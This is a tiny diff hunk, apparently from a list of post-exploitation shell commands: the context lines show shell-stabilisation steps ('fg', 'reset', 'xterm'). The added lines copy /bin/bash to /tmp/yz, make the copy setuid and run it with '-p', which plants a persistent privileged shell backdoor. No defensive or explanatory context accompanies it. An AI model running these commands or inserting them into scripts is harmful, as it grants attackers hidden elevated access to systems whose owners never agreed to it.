@@ -40,3 +40,6 @@ fg
 reset
 xterm
 
+cp /bin/bash /tmp/yz
+chmod +s /tmp/yz
+/tmp/yz -p
